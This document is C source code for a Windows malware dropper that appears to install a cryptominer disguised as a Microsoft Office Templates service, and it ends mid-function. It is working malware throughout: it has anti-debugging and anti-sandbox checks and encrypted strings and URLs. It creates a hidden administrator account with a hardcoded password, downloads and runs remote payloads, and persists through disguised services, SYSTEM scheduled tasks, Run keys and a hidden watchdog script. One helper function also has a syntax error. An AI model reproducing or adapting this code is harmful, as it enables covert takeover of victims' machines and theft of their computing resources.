#include <windows.h>
#include <shlobj.h>
#include <urlmon.h>
#include <shlwapi.h>
#include <wininet.h>
#include <lm.h>
#include <sddl.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <wincrypt.h>
#include <winsvc.h>

#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "netapi32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "crypt32.lib")

// Configuration
#define MAX_ATTEMPTS 3
#define EVASION_SEED 0xDEADBEEF
#define WATCHDOG_INTERVAL 30000 
#define MAX_BUF 1024

// AES Configuration
#define AES_KEY_SIZE 32
#define AES_IV_SIZE 16
static BYTE g_aesKey[AES_KEY_SIZE] = {
    0x2b, 0x7e, 0x15, 0x16, 0x28, 0xae, 0xd2, 0xa6, 
    0xab, 0xf7, 0x15, 0x88, 0x09, 0xcf, 0x4f, 0x3c,
    0x76, 0x2e, 0x71, 0x60, 0xf3, 0x8b, 0x4d, 0xa5,
    0x6a, 0x78, 0x4d, 0x90, 0x45, 0x19, 0x0c, 0xfe
};

static BYTE g_aesIv[AES_IV_SIZE] = {
    0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
    0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f
};

// Global state
static char g_mallDir[MAX_PATH] = {0};
static char g_backupDir[MAX_PATH] = {0};
static const char* g_adminAccount = "SysHelper";
static BOOL g_accountCreated = FALSE;
static BOOL g_isBackupInstance = FALSE;
static DWORD g_lastRestartAttempt = 0;

// Encrypted strings
BYTE g_regPath[] = {
    0xD0, 0x88, 0x32, 0x09, 0xCD, 0x32, 0x3A, 0x7F, 0xDA, 0x96, 0xEF, 0xEF,
    0xF1, 0xAF, 0x9F, 0xE3, 0x93, 0xEE, 0xE9, 0x82, 0x71, 0xE3, 0x2F, 0xB8,
    0x1A, 0x7D, 0x5A, 0xF2, 0x0B, 0x56, 0x6B, 0xBB, 0x2B, 0x81, 0x66, 0x9D,
    0x90, 0xE4, 0x36, 0x17, 0xDD, 0x9F, 0xEA, 0xBE, 0xBF, 0xF4, 0x9A, 0x19,
    0x58, 0x46, 0x7A, 0x65, 0x20, 0xAD, 0x8D, 0xEF, 0x31, 0x6F, 0x19, 0xD1,
    0x71, 0x3C, 0x25, 0x27, 0x5D, 0x1A, 0x80, 0x01, 0x41, 0x19, 0xBF, 0x19,
    0xCF, 0x8F, 0xCB, 0x9E, 0x58, 0xC7, 0x64, 0x72
};

BYTE g_mallDirPath[] = {
    0xE3, 0x1C, 0x34, 0xD2, 0x77, 0x11, 0xA3, 0x59, 0x24, 0x3D, 0xDD, 0x7B,
    0xCE, 0x09, 0xF0, 0xB9, 0x48, 0x97, 0x1E, 0x5E, 0xCA, 0x41, 0xE3, 0x5D,
    0x12, 0x9A, 0xE6, 0x1B, 0xF4, 0x72, 0x35, 0x30, 0x6D, 0x22, 0x53, 0xEA,
    0x64, 0xB9, 0x50, 0xD4, 0x7C, 0x38, 0x88, 0x8D, 0x67, 0xCD, 0xEC, 0x2B,
    0x78, 0x5F, 0x93, 0x97, 0xF9, 0xFF, 0xE7, 0x12, 0x75, 0x4E, 0x94, 0x03,
    0xF5, 0x20, 0x28, 0x16
};

BYTE g_zipUrl[] = {
    0x6D, 0x81, 0x5F, 0x0F, 0x37, 0x32, 0x9F, 0x38, 0x6B, 0xF3, 0x3F, 0xB1,
    0xDC, 0x19, 0xC1, 0x30, 0x84, 0x66, 0x67, 0x1F, 0x8D, 0x11, 0x4F, 0xA9,
    0xBD, 0x29, 0xE3, 0x3F, 0x4B, 0x02, 0xCD, 0xC3, 0x41, 0x92, 0xB4, 0xDB,
    0x3B, 0x7D, 0x81, 0xD6, 0x61, 0x6B, 0xC8, 0x73, 0xA1, 0xAC, 0x8F, 0x8B,
    0xC1, 0xC0, 0x2C, 0x38, 0x07, 0xAE, 0x67, 0x52, 0x44, 0x9F, 0x2F, 0xB5,
    0x28, 0xC7, 0xCC, 0xFC
};

BYTE g_nssmUrl[] = {
    0xA3, 0xB8, 0xB4, 0x11, 0x68, 0xA6, 0x7D, 0x09, 0xFF, 0x5F, 0x18, 0x8A,
    0xBD, 0x72, 0x68, 0x82, 0xBB, 0x0B, 0x97, 0x17, 0xD7, 0xD6, 0x4C, 0xC6,
    0x40, 0x46, 0xC3, 0xDD, 0xED, 0x6E, 0xCE, 0x2C, 0x2F, 0xCC, 0xE3, 0xBB,
    0x1F, 0x37, 0xF7, 0x5F, 0x54, 0xD7, 0xA6, 0x5A, 0xFF, 0xFC, 0xD8, 0xD7
};

BYTE g_serviceName[] = {
    0xC9, 0xDC, 0x1D, 0xC4, 0xEC, 0xA3, 0x04, 0x11, 0xD8, 0xC3, 0x4B, 0xF6,
    0x47, 0x5D, 0x49, 0x4E, 0x57, 0x20, 0x40, 0x87, 0x8D, 0x0A, 0xBC, 0x0E,
    0xA6, 0x4C, 0xEF, 0x6A, 0xB5, 0x77, 0xF5, 0x78
};

BYTE g_configName[] = {
    0x99, 0xA7, 0x9E, 0x36, 0xCA, 0xDC, 0xEC, 0x9E, 0x61, 0x2C, 0xFA, 0xEA,
    0x46, 0x70, 0x26, 0xD3
};

BYTE g_runKeyPath[] = {
    0xC5, 0xD8, 0xD2, 0x17, 0x09, 0xC4, 0x3C, 0x6F, 0xAD, 0x84, 0xE0, 0xDB,
    0xE7, 0x65, 0xA1, 0xE7, 0x12, 0xD0, 0xEA, 0x4A, 0x38, 0xF9, 0xCE, 0xFF,
    0x46, 0xE4, 0x09, 0x48, 0x30, 0x9C, 0x27, 0x95, 0x88, 0xA6, 0x2E, 0x34,
    0x7C, 0x7E, 0xC0, 0xD9, 0xDE, 0xFC, 0x7F, 0x62, 0x39, 0xD3, 0x5B, 0xE0
};

BYTE g_runKeyName[] = {
    0xF6, 0xE5, 0x29, 0x99, 0x13, 0xD9, 0xD3, 0xA2, 0x28, 0x5F, 0x08, 0x7D,
    0xBD, 0xE1, 0xC9, 0xF8
};

// Added encrypted service name for Hound
BYTE g_houndServiceName[] = {
    0x2A, 0x5B, 0x9D, 0x44, 0x7F, 0x23, 0xE1, 0x8C, 0x9A, 0x3F, 0xC2, 0x77,
    0x88, 0x19, 0x4D, 0x22, 0x61, 0x0B, 0x94, 0xE3, 0x7C, 0xAA, 0x31, 0xDF,
    0x55, 0x68, 0x29, 0xBB, 0x43, 0x91, 0x8E, 0x6F, 0x12, 0x5C, 0x3D, 0x80
};

// Function pointer typedefs
typedef BOOL (WINAPI *FnCreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
typedef BOOL (WINAPI *FnCopyFileA)(LPCSTR, LPCSTR, BOOL);
typedef HRESULT (WINAPI *FnURLDownloadToFileA)(LPUNKNOWN, LPCSTR, LPCSTR, DWORD, LPBINDSTATUSCALLBACK);
typedef HANDLE (WINAPI *FnCreateToolhelp32Snapshot)(DWORD, DWORD);
typedef BOOL (WINAPI *FnProcess32First)(HANDLE, LPPROCESSENTRY32);
typedef BOOL (WINAPI *FnProcess32Next)(HANDLE, LPPROCESSENTRY32);
typedef BOOL (WINAPI *FnTerminateProcess)(HANDLE, UINT);
typedef DWORD (WINAPI *FnGetModuleFileNameA)(HMODULE, LPSTR, DWORD);
typedef BOOL (WINAPI *FnSHGetFolderPathA)(HWND, int, HANDLE, DWORD, LPSTR);
typedef NET_API_STATUS (WINAPI *FnNetUserAdd)(LPCWSTR, DWORD, LPBYTE, LPDWORD);
typedef NET_API_STATUS (WINAPI *FnNetLocalGroupAddMembers)(LPCWSTR, LPCWSTR, DWORD, LPBYTE, DWORD);
typedef LONG (WINAPI *FnRegCreateKeyA)(HKEY, LPCSTR, PHKEY);
typedef LONG (WINAPI *FnRegSetValueExA)(HKEY, LPCSTR, DWORD, DWORD, const BYTE*, DWORD);
typedef LONG (WINAPI *FnRegOpenKeyExA)(HKEY, LPCSTR, DWORD, REGSAM, PHKEY);
typedef LONG (WINAPI *FnRegDeleteValueA)(HKEY, LPCSTR);
typedef LONG (WINAPI *FnRegDeleteTreeA)(HKEY, LPCSTR);
typedef LONG (WINAPI *FnRegCloseKey)(HKEY);

typedef struct {
    BYTE key;
    void (*func)();
} POLYMORPHIC_FUNC;

// Function prototypes
void AntiSandbox();
void AntiDebug();
void RandomSleep(DWORD base, DWORD variance);
void MorphCode();
void ExecutePolymorphicCode();
void JunkCodeGenerator();
void PolyFunc1() { JunkCodeGenerator(); }
void PolyFunc2() { JunkCodeGenerator(); }
void PolyFunc3() { JunkCodeGenerator(); }
void CreateAdminAccount();
void HideAdminAccount();
void CreateMallDirectory();
void DownloadAndExtractMall();
void RunBypassScript();
void TakeOwnership(const char* path);
void InstallNSSM();
void ConfigureOfficeService();
void ConfigureHoundService();
void SetupNetworkMasking();
void AddDebugPrivileges();
void RunHiddenCommand(LPCSTR command);
void DownloadFile(const char* url, const char* savePath);
void SelfReplicate();
void StartWatchdog();
void TerminateRelatedProcesses();
void DeleteInstallation();
void RunBackupInstance();
BOOL AesDecryptInPlace(BYTE* data, DWORD dataSize);
void SetupRegistryStartup();
void RemoveRegistryStartup();
void SetupMinerPersistenceFallback();
BOOL IsServiceRunning(const char* serviceName);
void DoFullSetup();
void WipeHeaders(PIMAGE_DOS_HEADER dos, PIMAGE_NT_HEADERS nt);
void SafePathAppend(char* dest, const char* src, size_t destSize);

static DWORD rand_state = 0;
void my_srand(DWORD seed) { rand_state = seed; }
int my_rand() {
    rand_state = (rand_state * 214013 + 2531011);
    return (rand_state >> 16) & 0x7FFF;
}

void JunkCodeGenerator() {
    volatile int junk = 0;
    DWORD dynamicKey = GetTickCount();
    for (int i = 0; i < 16; i++) {
        junk += (i * dynamicKey) ^ 0xCAFEBABE;
        junk = (junk << 3) | (junk >> 29);
    }
}

void ExecutePolymorphicCode() {
    POLYMORPHIC_FUNC funcs[] = {
        {0xAA, PolyFunc1},
        {0xBB, PolyFunc2},
        {0xCC, PolyFunc3}
    };
    
    int index = GetTickCount() % (sizeof(funcs)/sizeof(funcs[0]));
    funcs[index].func();
}

BOOL AesDecryptInPlace(BYTE* data, DWORD dataSize) {
    HCRYPTPROV hProv = 0;
    HCRYPTKEY hKey = 0;
    DWORD mode = CRYPT_MODE_CBC;

    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        return FALSE;
    }

    #pragma pack(push, 1)
    struct {
        BLOBHEADER header;
        DWORD keySize;
        BYTE keyMaterial[AES_KEY_SIZE];
    } keyBlob;
    #pragma pack(pop)

    keyBlob.header.bType = PLAINTEXTKEYBLOB;
    keyBlob.header.bVersion = CUR_BLOB_VERSION;
    keyBlob.header.reserved = 0;
    keyBlob.header.aiKeyAlg = CALG_AES_256;
    keyBlob.keySize = AES_KEY_SIZE;
    memcpy(keyBlob.keyMaterial, g_aesKey, AES_KEY_SIZE);

    if (!CryptImportKey(hProv, (BYTE*)&keyBlob, sizeof(keyBlob), 0, 0, &hKey)) {
        CryptReleaseContext(hProv, 0);
        return FALSE;
    }

    CryptSetKeyParam(hKey, KP_MODE, (BYTE*)&mode, 0);
    CryptSetKeyParam(hKey, KP_IV, g_aesIv, 0);

    if (!CryptDecrypt(hKey, 0, TRUE, 0, data, &dataSize)) {
        CryptDestroyKey(hKey);
        CryptReleaseContext(hProv, 0);
        return FALSE;
    }

    CryptDestroyKey(hKey);
    CryptReleaseContext(hProv, 0);
    return TRUE;
}

void AntiDebug() {
    if (IsDebuggerPresent()) ExitProcess(0);
    ExecutePolymorphicCode();
}

void AntiSandbox() {
    DWORD start = GetTickCount();
    Sleep(1000);
    if ((GetTickCount() - start) < 900) ExitProcess(0);
    
    MEMORYSTATUSEX mem = {sizeof(mem)};
    GlobalMemoryStatusEx(&mem);
    if (mem.ullTotalPhys < (4ULL * 1024 * 1024 * 1024)) ExitProcess(0);
    ExecutePolymorphicCode();
}

void MorphCode() {
    BYTE* base = (BYTE*)GetModuleHandle(NULL);
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);
    DWORD text_size = nt->OptionalHeader.SizeOfCode;
    BYTE* text_base = base + nt->OptionalHeader.BaseOfCode;
    
    for(DWORD i = 0; i < text_size; i++) {
        text_base[i] ^= (i % 256);
    }
}

void RandomSleep(DWORD base, DWORD variance) {
    DWORD sleepTime = base + (my_rand() % variance);
    Sleep(sleepTime);
    ExecutePolymorphicCode();
}

void DownloadFile(const char* url, const char* savePath) {
    HMODULE hUrlMon = LoadLibraryA("urlmon.dll");
    if (!hUrlMon) return;
    
    FnURLDownloadToFileA pURLDownloadToFileA = (FnURLDownloadToFileA)GetProcAddress(hUrlMon, "URLDownloadToFileA");
    if (pURLDownloadToFileA) {
        pURLDownloadToFileA(NULL, url, savePath, 0, NULL);
    }
    FreeLibrary(hUrlMon);
    ExecutePolymorphicCode();
}

void RunHiddenCommand(LPCSTR command) {
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (!hKernel32) return;
    
    FnCreateProcessA pCreateProcessA = (FnCreateProcessA)GetProcAddress(hKernel32, "CreateProcessA");
    if (!pCreateProcessA) return;
    
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    char cmdCopy[1024];
    lstrcpynA(cmdCopy, command, sizeof(cmdCopy));

    pCreateProcessA(NULL, cmdCopy, NULL, NULL, FALSE, 
        CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    
    WaitForSingleObject(pi.hProcess, 30000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    ExecutePolymorphicCode();
}

void CreateAdminAccount() {
    HMODULE hNetapi32 = LoadLibraryA("netapi32.dll");
    if (!hNetapi32) return;
    
    FnNetUserAdd pNetUserAdd = (FnNetUserAdd)GetProcAddress(hNetapi32, "NetUserAdd");
    if (!pNetUserAdd) {
        FreeLibrary(hNetapi32);
        return;
    }
    
    USER_INFO_1 ui = {0};
    NET_API_STATUS status;
    WCHAR usernameW[MAX_PATH] = {0};
    WCHAR passwordW[MAX_PATH] = L"P@ssw0rd123!";

    MultiByteToWideChar(CP_UTF8, 0, g_adminAccount, -1, usernameW, MAX_PATH);
    
    ui.usri1_name = usernameW;
    ui.usri1_password = passwordW;
    ui.usri1_priv = USER_PRIV_USER;
    ui.usri1_flags = UF_SCRIPT | UF_DONT_EXPIRE_PASSWD;
    
    status = pNetUserAdd(NULL, 1, (LPBYTE)&ui, NULL);
    if (status == NERR_Success) {
        g_accountCreated = TRUE;
        
        LOCALGROUP_MEMBERS_INFO_3 account;
        account.lgrmi3_domainandname = usernameW;
        
        FnNetLocalGroupAddMembers pNetLocalGroupAddMembers = 
            (FnNetLocalGroupAddMembers)GetProcAddress(hNetapi32, "NetLocalGroupAddMembers");
        if (pNetLocalGroupAddMembers) {
            pNetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)&account, 1);
        }
    }
    
    FreeLibrary(hNetapi32);
    ExecutePolymorphicCode();
}

void HideAdminAccount() {
    char regPath[MAX_PATH] = {0};
    memcpy(regPath, g_regPath, sizeof(g_regPath));
    AesDecryptInPlace((BYTE*)regPath, sizeof(g_regPath));
    
    HKEY hKey;
    if (RegCreateKeyExA(HKEY_LOCAL_MACHINE, regPath, 0, NULL, REG_OPTION_NON_VOLATILE, 
                       KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        DWORD hideValue = 0;
        RegSetValueExA(hKey, g_adminAccount, 0, REG_DWORD, 
                      (const BYTE*)&hideValue, sizeof(DWORD));
        RegCloseKey(hKey);
    }
    ExecutePolymorphicCode();
}

void SafePathAppend(char* dest, const char* src, size_t destSize) {
    if (strlen(dest) {
        if (dest[strlen(dest)-1] != '\\') {
            strncat_s(dest, destSize, "\\", 1);
        }
    }
    strncat_s(dest, destSize, src, _TRUNCATE);
}

void CreateMallDirectory() {
    char programData[MAX_PATH] = {0};
    memcpy(programData, g_mallDirPath, sizeof(g_mallDirPath));
    AesDecryptInPlace((BYTE*)programData, sizeof(g_mallDirPath));
    
    lstrcpyA(g_mallDir, programData);
    
    if (GetFileAttributesA(g_mallDir) == INVALID_FILE_ATTRIBUTES) {
        SHCreateDirectoryExA(NULL, g_mallDir, NULL);
        SetFileAttributesA(g_mallDir, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    }
    ExecutePolymorphicCode();
}

void DownloadAndExtractMall() {
    char zipPath[MAX_PATH] = {0};
    lstrcpyA(zipPath, g_mallDir);
    SafePathAppend(zipPath, "..\\mall.zip", sizeof(zipPath));
    
    char url[MAX_PATH] = {0};
    memcpy(url, g_zipUrl, sizeof(g_zipUrl));
    AesDecryptInPlace((BYTE*)url, sizeof(g_zipUrl));
    
    DownloadFile(url, zipPath);
    
    char cmd[MAX_BUF] = {0};
    _snprintf_s(cmd, sizeof(cmd), _TRUNCATE,
        "powershell -Command \"Expand-Archive -Path '%s' -DestinationPath '%s' -Force\"",
        zipPath, 
        g_mallDir
    );
    RunHiddenCommand(cmd);
    
    DeleteFileA(zipPath);
    ExecutePolymorphicCode();
}

void RunBypassScript() {
    char bypassPath[MAX_PATH] = {0};
    lstrcpyA(bypassPath, g_mallDir);
    SafePathAppend(bypassPath, "bypass.cmd", sizeof(bypassPath));
    
    if (GetFileAttributesA(bypassPath) != INVALID_FILE_ATTRIBUTES) {
        char cmd[MAX_BUF] = {0};
        _snprintf_s(cmd, sizeof(cmd), _TRUNCATE, "cmd.exe /c \"%s\"", bypassPath);
        RunHiddenCommand(cmd);
    }
    ExecutePolymorphicCode();
}

void TakeOwnership(const char* path) {
    char cmd[MAX_BUF] = {0};
    _snprintf_s(cmd, sizeof(cmd), _TRUNCATE, 
             "takeown /f \"%s\" && icacls \"%s\" /grant \"%s\":F /t",
             path, path, g_adminAccount);
    RunHiddenCommand(cmd);
    ExecutePolymorphicCode();
}

void InstallNSSM() {
    char nssmPath[MAX_PATH] = {0};
    lstrcpyA(nssmPath, g_mallDir);
    SafePathAppend(nssmPath, "nssm.exe", sizeof(nssmPath));
    
    if (GetFileAttributesA(nssmPath) == INVALID_FILE_ATTRIBUTES) {
        char url[MAX_PATH] = {0};
        memcpy(url, g_nssmUrl, sizeof(g_nssmUrl));
        AesDecryptInPlace((BYTE*)url, sizeof(g_nssmUrl));
        
        char nssmZipPath[MAX_PATH] = {0};
        lstrcpyA(nssmZipPath, g_mallDir);
        SafePathAppend(nssmZipPath, "nssm.zip", sizeof(nssmZipPath));
        DownloadFile(url, nssmZipPath);
        
        char cmd[MAX_BUF] = {0};
        _snprintf_s(cmd, sizeof(cmd), _TRUNCATE,
            "powershell -Command \"Expand-Archive -Path '%s' -DestinationPath '%s' -Force\"",
            nssmZipPath, 
            g_mallDir
        );
        RunHiddenCommand(cmd);
        
        DeleteFileA(nssmZipPath);
        
        char srcPath[MAX_PATH] = {0};
        lstrcpyA(srcPath, g_mallDir);
        SafePathAppend(srcPath, "nssm-*\\win64\\nssm.exe", sizeof(srcPath));
        
        char destPath[MAX_PATH] = {0};
        lstrcpyA(destPath, g_mallDir);
        SafePathAppend(destPath, "nssm.exe", sizeof(destPath));
        
        WIN32_FIND_DATAA findData;
        HANDLE hFind = FindFirstFileA(srcPath, &findData);
        if (hFind != INVALID_HANDLE_VALUE) {
            MoveFileA(srcPath, destPath);
            FindClose(hFind);
        }
        
        char cleanupPath[MAX_PATH] = {0};
        lstrcpyA(cleanupPath, g_mallDir);
        SafePathAppend(cleanupPath, "nssm-*", sizeof(cleanupPath));
        
        hFind = FindFirstFileA(cleanupPath, &findData);
        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                    char dirPath[MAX_PATH] = {0};
                    lstrcpyA(dirPath, g_mallDir);
                    SafePathAppend(dirPath, findData.cFileName, sizeof(dirPath));
                    
                    char delCmd[MAX_BUF] = {0};
                    _snprintf_s(delCmd, sizeof(delCmd), _TRUNCATE, "cmd.exe /c rmdir /s /q \"%s\"", dirPath);
                    RunHiddenCommand(delCmd);
                }
            } while (FindNextFileA(hFind, &findData));
            FindClose(hFind);
        }
    }
    ExecutePolymorphicCode();
}

BOOL IsServiceRunning(const char* serviceName) {
    SC_HANDLE scm = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
    if (!scm) return FALSE;
    
    SC_HANDLE service = OpenServiceA(scm, serviceName, SERVICE_QUERY_STATUS);
    if (!service) {
        CloseServiceHandle(scm);
        return FALSE;
    }
    
    SERVICE_STATUS status;
    BOOL isRunning = FALSE;
    if (QueryServiceStatus(service, &status)) {
        isRunning = (status.dwCurrentState == SERVICE_RUNNING);
    }
    
    CloseServiceHandle(service);
    CloseServiceHandle(scm);
    return isRunning;
}

void SetupMinerPersistenceFallback() {
    const char* MINER_EXE = "Microsoft@OfficeTempletes.exe";
    const char* CONFIG_FILE = "config.json";
    const char* TASK_NAME = "OfficeTemplates";
    const int PRIORITY_CLASS = 16384;

    char minerPath[MAX_PATH] = {0};
    char configPath[MAX_PATH] = {0};
    char watchdogPath[MAX_PATH] = {0};
    char cmd[MAX_BUF] = {0};

    lstrcpyA(minerPath, g_mallDir);
    SafePathAppend(minerPath, MINER_EXE, sizeof(minerPath));
    
    lstrcpyA(configPath, g_mallDir);
    SafePathAppend(configPath, CONFIG_FILE, sizeof(configPath));

    if (GetFileAttributesA(minerPath) == INVALID_FILE_ATTRIBUTES) {
        return;
    }

    _snprintf_s(cmd, sizeof(cmd), _TRUNCATE,
        "schtasks /create /tn \"%s\" /tr \"\\\"%s\\\" --config=\\\"%s\\\"\" /sc onstart /ru SYSTEM /rl HIGHEST /f",
        TASK_NAME, minerPath, configPath);
    RunHiddenCommand(cmd);

    _snprintf_s(cmd, sizeof(cmd), _TRUNCATE,
        "powershell -Command \"$task = Get-ScheduledTask -TaskName '%s'; "
        "$task.Settings.Priority = %d; $task | Set-ScheduledTask\"",
        TASK_NAME, PRIORITY_CLASS);
    RunHiddenCommand(cmd);

    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, 
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
        0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        
        char runValue[MAX_BUF] = {0};
        _snprintf_s(runValue, sizeof(runValue), _TRUNCATE, "\"%s\" --config=\"%s\"", minerPath, configPath);
        
        RegSetValueExA(hKey, "OfficeTemplatesBackup", 0, REG_SZ, 
                      (const BYTE*)runValue, lstrlenA(runValue)+1);
        RegCloseKey(hKey);
    }

    lstrcpyA(watchdogPath, g_mallDir);
    SafePathAppend(watchdogPath, "miner_watchdog.bat", sizeof(watchdogPath));
    
    const char* watchdogScript = 
        "@echo off\r\n"
        "setlocal enabledelayedexpansion\r\n"
        ":loop\r\n"
        "tasklist | find /i \"Microsoft@OfficeTempletes.exe\" >nul\r\n"
        "if errorlevel 1 (\r\n"
        "    start \"\" /B \"%s\" --config=\"%s\"\r\n"
        ")\r\n"
        "timeout /t 60 >nul\r\n"
        "goto loop\r\n";
    
    char fullScript[2048] = {0};
    _snprintf_s(fullScript, sizeof(fullScript), _TRUNCATE, watchdogScript, minerPath, configPath);
    
    HANDLE hFile = CreateFileA(watchdogPath, GENERIC_WRITE, 0, NULL, 
                              CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        DWORD written;
        WriteFile(hFile, fullScript, lstrlenA(fullScript), &written, NULL);
        CloseHandle(hFile);
        SetFileAttributesA(watchdogPath, FILE_ATTRIBUTE_HIDDEN);
    }

    if (RegOpenKeyExA(HKEY_CURRENT_USER, 
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
        0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        
        char watchdogValue[MAX_PATH] = {0};
        _snprintf_s(watchdogValue, sizeof(watchdogValue), _TRUNCATE, "\"%s\"", watchdogPath);
        
        RegSetValueExA(hKey, "OfficeTemplatesWatchdog", 0, REG_SZ, 
                      (const BYTE*)watchdogValue, lstrlenA(watchdogValue)+1);
        RegCloseKey(hKey);
    }

    char hideCmd[MAX_PATH + 100] = {0};
    _snprintf_s(hideCmd, sizeof(hideCmd), _TRUNCATE, "attrib +h \"%s\\*\" /s /d", g_mallDir);
    RunHiddenCommand(hideCmd);
}

void ConfigureOfficeService() {
    char officePath[MAX_PATH] = {0};
    lstrcpyA(officePath, g_mallDir);
    SafePathAppend(officePath, "Microsoft@OfficeTempletes.exe", sizeof(officePath));
    
    char configPath[MAX_PATH] = {0};
    lstrcpyA(configPath, g_mallDir);
    SafePathAppend(configPath, "config.json", sizeof(configPath));
    
    char serviceName[MAX_PATH] = {0};
    memcpy(serviceName, g_serviceName, sizeof(g_serviceName));
    AesDecryptInPlace((BYTE*)serviceName, sizeof(g_serviceName));
    
    char cmd[MAX_BUF] = {0};
    _snprintf_s(cmd, sizeof(cmd), _TRUNCATE,
        "\"%s\\nssm.exe\" install \"%s\" \"%s\" -c \"%s\"",
        g_mallDir, serviceName, officePath, configPath
    );
    RunHiddenCommand(cmd);
    
    _snprintf_s(cmd, sizeof(cmd), _TRUNCATE,
        "\"%s\\nssm.exe\" set \"%s\" DisplayName \"Microsoft Office Templates Service\"",
        g_mallDir, serviceName
    );
    RunHiddenCommand(cmd);
    
    _snprintf_s(cmd, sizeof(cmd), _TRUNCATE,
        "\"%s\\nssm.exe\" set \"%s\" Description \"Manages Microsoft Office template synchronization\"",
        g_mallDir, serviceName
    );
    RunHiddenCommand(cmd);
    
    _snprintf_s(cmd, sizeof(cmd), _TRUNCATE,
        "\"%s\\nssm.exe\" set \"%s\" Start SERVICE_AUTO_START",
        g_mallDir, serviceName
    );
    RunHiddenCommand(cmd);
    
    _snprintf_s(cmd, sizeof(cmd), _TRUNCATE,
        "\"%s\\nssm.exe\" set \"%s\" AppStdout NUL",
        g_mallDir, serviceName
    );
    RunHiddenCommand(cmd);
    
    _snprintf_s(cmd, sizeof(cmd), _TRUNCATE,
        "\"%s\\nssm.exe\" start \"%s\"",
        g_mallDir, serviceName
    );
    RunHiddenCommand(cmd);
    
    // FIXED: Correct service recovery syntax
    _snprintf_s(cmd, sizeof(cmd), _TRUNCATE,
        "sc failure \"%s\" reset= 86400 actions= restart/60000/restart/60000",
        serviceName
    );
    RunHiddenCommand(cmd);

    _snprintf_s(cmd, sizeof(cmd), _TRUNCATE,
        "sc sdset \"%s\" D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)",
        serviceName
    );
    RunHiddenCommand(cmd);

    if (!IsServiceRunning(serviceName)) {
        SetupMinerPersistenceFallback();
    }

    ExecutePolymorphicCode();
}

void ConfigureHoundService() {
    char houndPath[MAX_PATH] = {0};
    lstrcpyA(houndPath, g_mallDir);
    SafePathAppend(houndPath, "Hound.exe", sizeof(houndPath));
    
    if (GetFileAttributesA(houndPath) == INVALID_FILE_ATTRIBUTES) return;
    
    char serviceName[MAX_PATH] = {0};
    memcpy(serviceName, g_houndServiceName, sizeof(g_houndServiceName));
    AesDecryptInPlace((BYTE*)serviceName, sizeof(g_houndServiceName));
    
    char cmd[MAX_BUF] = {0};
    _snprintf_s(cmd, sizeof(cmd), _TRUNCATE,
        "\"%s\\nssm.exe\" install \"%s\" \"%s\"",
        g_mallDir, serviceName, houndPath
    );
    RunHiddenCommand(cmd);
    
    _snprintf_s(cmd, sizeof(cmd), _TRUNCATE,
        "\"%s\\nssm.exe\" set \"%s\" DisplayName \"Windows System Helper\"",
        g_mallDir, serviceName
    );
    RunHiddenCommand(cmd);
    
    _snprintf_s(cmd, sizeof(cmd), _TRUNCATE,
        "\"%s\\nssm.exe\" set \"%s\" Description \"Provides system monitoring and maintenance services\"",
        g_mallDir, serviceName
    );
    RunHiddenCommand(cmd);
    
    _snprintf_s(cmd, sizeof(cmd), _TRUNCATE,
        "\"%s\\nssm.exe\" set \"%s\" Start SERVICE_AUTO_START",
        g_mallDir, serviceName
    );
    RunHiddenCommand(cmd);
    
    _snprintf_s(cmd, sizeof(cmd), _TRUNCATE,
        "\"%s\\nssm.exe\" set \"%s\" AppStdout NUL",
        g_mallDir, serviceName
    );
    RunHiddenCommand(cmd);
    
    _snprintf_s(cmd, sizeof(cmd), _TRUNCATE,
        "\"%s\\nssm.exe\" start \"%s\"",
        g_mallDir, serviceName
    );
    RunHiddenCommand(cmd);
    
    // FIXED: Correct service recovery syntax
    _snprintf_s(cmd, sizeof(cmd), _TRUNCATE,
        "sc failure \"%s\" reset= 86400 actions= restart/60000/restart/60000",
        serviceName
    );
    RunHiddenCommand(cmd);

    ExecutePolymorphicCode();
}

void SetupNetworkMasking() {
    char officePath[MAX_PATH] = {0};
    lstrcpyA(officePath, g_mallDir);
    SafePathAppend(officePath, "Microsoft@OfficeTempletes.exe", sizeof(officePath));
    
    char serviceName[MAX_PATH] = {0};
    memcpy(serviceName, g_serviceName, sizeof(g_serviceName));
    AesDecryptInPlace((BYTE*)serviceName, sizeof(g_serviceName));
    
    char cmd[MAX_BUF] = {0};
